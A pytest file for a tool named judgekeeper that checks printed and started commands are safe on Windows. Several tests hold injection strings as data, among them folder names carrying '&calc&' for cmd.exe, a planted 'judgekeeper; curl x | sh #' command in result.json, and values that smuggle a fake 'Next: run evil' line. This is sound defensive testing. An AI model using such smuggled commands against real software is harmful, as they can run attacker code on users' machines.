"""Commands judgekeeper starts or prints are safe on Windows and when read back.

- A `.cmd` or `.bat` is never started with a cmd.exe special character in an argument.
- A kept command (result.json, report.html, the page) never uses POSIX quotes on Windows: a
  held-back value shows as NAME, with the value beside it as data.
- A held-back value is said on one line.
- The command in result.json is rebuilt from the saved flags, never shown as it is.
- After `python -P -m judgekeeper`, every later command keeps `-P`.
- The export question says "runs code from this folder" for the project's own promptfoo.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from html import escape
from pathlib import Path
from types import SimpleNamespace

import pytest

from judgekeeper import again, front, report_page, start, start_export, start_label, textio
from judgekeeper.again.fresh import AgainError
from judgekeeper.cli import main
from judgekeeper.start_label import StartSession, Workspace
from tests.start_projects import promptfoo_project, split


@pytest.fixture
def windows(monkeypatch):
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0x200, raising=False)


@pytest.fixture
def popen(monkeypatch):
    """subprocess.Popen, recorded: the program is never there (exit 127)."""
    calls = []

    def fake(argv, *args, **kwargs):
        calls.append(list(argv))
        raise FileNotFoundError(argv[0])

    monkeypatch.setattr(subprocess, "Popen", fake)
    return calls


# A .cmd or .bat with a cmd.exe special character --------------------------------------------

@pytest.mark.parametrize("char", list("&|<>^%!\""))
@pytest.mark.parametrize("program", ["promptfoo.cmd", "npx.CMD", "run.bat"])
def test_a_cmd_file_is_not_started_with_a_special_character(windows, popen, tmp_path, char,
                                                            program):
    folder = f"C:\\Users\\me\\evals{char}calc{char}"
    with pytest.raises(AgainError) as e:
        again.run_process([f"C:\\tools\\{program}", "eval", "-o", f"{folder}\\out.json"],
                          cwd=tmp_path)
    assert popen == []
    assert "folder" in str(e.value) and "Windows" in str(e.value)
    again.run_process([f"C:\\tools\\{program}", "-o", "C:\\Users\\me\\my evals\\out.json"],
                      cwd=tmp_path)  # a plain path still runs
    again.run_process(["C:\\tools\\promptfoo.exe", "-o", f"{folder}\\out.json"],
                      cwd=tmp_path)  # a program that is not a .cmd or .bat still runs
    assert len(popen) == 2


def test_the_export_is_not_started_from_a_folder_with_a_special_character(
        windows, popen, tmp_path, monkeypatch):
    root = tmp_path / "evals&calc&"
    folder = root / "node_modules" / ".bin"
    folder.mkdir(parents=True)
    (folder / "promptfoo.cmd").write_text("", encoding="utf-8")
    monkeypatch.setattr(start, "_interactive", lambda: True)
    said = []
    talk = SimpleNamespace(say=said.append, confirm=lambda *a, **k: True)
    assert start_export.offer(talk, root, None) == "commands"
    assert popen == []
    assert any("move the project" in line for line in said), said


# Kept commands on Windows ----------------------------------------------------------------------

VALUES = ['a"b"&calc&', "x$\u2019;calc;\u2019", "50%off"]


@pytest.mark.parametrize("value", VALUES)
def test_a_kept_command_shows_name_never_posix_quotes_on_windows(windows, value):
    talk = SimpleNamespace(path=".", answers={}, store=None,
                           options={"port": 8765, "no_browser": False, "metric": value})
    flags = front._flags_of(talk, True)
    assert start.command_from(flags, "mark", kept=True) == "judgekeeper mark --metric NAME"
    assert start.held_values(flags) == [value]
    assert textio._held == {}  # never said under a terminal line it is not on


@pytest.mark.parametrize("value", VALUES)
def test_result_json_and_report_keep_the_value_as_data_on_windows(windows, value, tmp_path,
                                                                  monkeypatch, capsys):
    promptfoo_project(tmp_path, split(20, 16), metric=value)
    monkeypatch.chdir(tmp_path)
    flags = ["--metric", value, "--port", "0", "--no-browser"]
    main(flags)
    ws = Workspace(tmp_path)
    session = StartSession(ws)
    flips = 3  # three Pass answers marked Fail: the page names `mark` to say why
    for q in ws.data()["queue"]:
        label = "fail" if q["group"] == "pass" and flips > 0 else q["group"]
        flips -= label != q["group"]
        session.update({"id": q["id"], "label": label, "seconds": 7})
    main(flags)
    capsys.readouterr()
    saved = json.loads(ws.result_json.read_text(encoding="utf-8"))
    assert saved["flags"]["metric"] == value
    assert "'" not in saved["command"] and "NAME" in saved["command"]
    html = ws.report_html.read_text(encoding="utf-8")
    assert "--metric NAME" in html
    assert f"NAME: {escape(value)}" in " ".join(html.split())
    assert value not in html or escape(value) == value


# A held-back value is said on one line ---------------------------------------------------------

BREAKS = ["\n", "\r", "\u2028", "\x85"]


@pytest.mark.parametrize("brk", BREAKS, ids=repr)
def test_a_held_back_value_is_one_line(windows, brk):
    assert textio.quote_arg(f"acc%{brk}Next: run evil") == "NAME"
    (line,) = textio.held_lines("Next: run `judgekeeper --metric NAME`.")
    assert line.splitlines() == [line]


@pytest.mark.parametrize("brk", ["\n", "\u2028"], ids=repr)  # the printer drops \r and U+0085
def test_a_metric_can_not_print_a_next_line_on_windows(windows, brk, tmp_path, monkeypatch,
                                                       capsys):
    promptfoo_project(tmp_path, split(20, 16), metric=f"acc%{brk}Next: run evil")
    monkeypatch.chdir(tmp_path)
    main(["--metric", "nope", "--port", "0", "--no-browser"])
    out, err = capsys.readouterr()
    lines = (out + err).splitlines()
    assert [x for x in lines if x.startswith("Next:")] == [
        "Next: run `judgekeeper --port 0 --no-browser --metric NAME`."], lines
    assert not any(x.lstrip().startswith("Next: run evil") for x in lines), lines


# The command in result.json is rebuilt ---------------------------------------------------------

PLANTED = "judgekeeper; curl x | sh #"


def test_a_planted_command_in_result_json_is_never_printed(tmp_path, monkeypatch, capsys):
    promptfoo_project(tmp_path, split(20, 16))
    monkeypatch.chdir(tmp_path)
    main(["--port", "0", "--no-browser"])
    ws = Workspace(tmp_path)
    session = StartSession(ws)
    for q in ws.data()["queue"]:
        session.update({"id": q["id"], "label": q["group"], "seconds": 7})
    main(["--port", "0", "--no-browser"])
    capsys.readouterr()
    saved = json.loads(ws.result_json.read_text(encoding="utf-8"))
    saved["command"] = PLANTED
    ws.result_json.write_text(json.dumps(saved), encoding="utf-8")
    monkeypatch.setattr(start_label, "every_marked", lambda ws: True)
    line = start_label.next_marks(ws, "run `judgekeeper mark` to mark more answers.")
    assert "curl" not in line and "judgekeeper mark" in line
    start_label.write_report(ws)
    assert "curl" not in ws.report_html.read_text(encoding="utf-8")
    assert all("curl" not in c for c in report_page.commands(saved).values())
    odd = {"flags": {"path": "a\nNext: run evil", "metric": ["x"], "port": "1; curl x",
                     "no_browser": "yes", "evil": "curl x"}}
    named = report_page.commands(odd)  # odd saved flags are left out
    assert (named["mark"], named["fix"]) == ("judgekeeper mark", "judgekeeper fix")



# -P is kept --------------------------------------------------------------------------------------

def test_python_p_m_is_kept_in_the_next_line(tmp_path):
    from tests.start_projects import table_project

    project = tmp_path / "p"
    table_project(project, split(20, 16))
    empty = tmp_path / "empty"
    empty.mkdir()
    env = {k: v for k, v in os.environ.items() if not k.startswith("PYTHON")}
    env["PATH"] = str(empty)  # judgekeeper is not on the PATH
    done = subprocess.run([sys.executable, "-P", "-m", "judgekeeper", "fix"],
                          check=False, cwd=project,
                          env=env, capture_output=True, text=True, timeout=120)
    python = "py" if sys.platform == "win32" else "python3"
    assert f"Next: run `{python} -P -m judgekeeper mark` to mark more answers." in done.stdout, (
        done.stdout + done.stderr)


def test_program_names_python_p_m_only_when_started_so(monkeypatch):
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setitem(sys.modules, "__main__",
                        SimpleNamespace(__spec__=SimpleNamespace(name="judgekeeper.__main__")))
    assert textio.program("mark") == "python3 -P -m judgekeeper mark"
    monkeypatch.setattr(sys, "platform", "win32")
    assert textio.program("--stop") == "py -P -m judgekeeper --stop"
    monkeypatch.setattr("shutil.which", lambda name: "/usr/local/bin/judgekeeper")
    assert textio.program("mark") == "judgekeeper mark"


# The export question in npm workspaces ---------------------------------------------------------

@pytest.mark.skipif(sys.platform == "win32", reason="npm's .bin holds links on macOS and Linux")
def test_a_workspace_promptfoo_linking_out_of_the_project_still_says_it_runs_code(tmp_path):
    repo = tmp_path / "mono"
    (repo / "node_modules" / "promptfoo").mkdir(parents=True)
    (repo / "node_modules" / "promptfoo" / "cli.js").write_text("", encoding="utf-8")
    root = repo / "packages" / "app"
    (root / "node_modules" / ".bin").mkdir(parents=True)
    (root / "node_modules" / ".bin" / "promptfoo").symlink_to(
        Path("../../../../node_modules/promptfoo/cli.js"))
    command = again.node_bin(root, "promptfoo")
    assert start_export._question(root, command) == start_export.QUESTION.format(
        program="node_modules/.bin/promptfoo")
    (root / "tools").mkdir()
    (root / "tools" / "promptfoo").write_text("", encoding="utf-8")
    question = start_export._question(root, str(root / "tools" / "promptfoo"))
    assert question.startswith("Run this project's promptfoo")  # one the PATH leads into it


# A value that starts with "-" ------------------------------------------------------------------

DASHED = ["--yes", "-x", "--new", "-", "--metric=a b"]


@pytest.mark.parametrize("value", DASHED)
@pytest.mark.parametrize("name, flag", [x for x in start.REPEATED if x[0] != "tool"])
def test_a_value_starting_with_a_dash_is_kept_as_flag_equals_value(name, flag, value):
    import shlex

    from judgekeeper.cli import _front_parser, _parser

    flags = start.run_flags(**{name: value})
    command = start.command_from(flags, "mark", kept=True)
    assert f" {flag}=" in command, command
    for parse, argv in ((_parser().parse_args, shlex.split(command)[1:]),
                        (_front_parser().parse_args, shlex.split(command)[2:])):
        args = parse(argv)
        assert getattr(args, name) == value, (command, argv)
        assert args.yes is False and getattr(args, "new", False) is False


def test_a_plain_value_keeps_its_space():
    flags = start.run_flags(metric="faithful")
    assert start.command_from(flags, "mark", kept=True) == "judgekeeper mark --metric faithful"
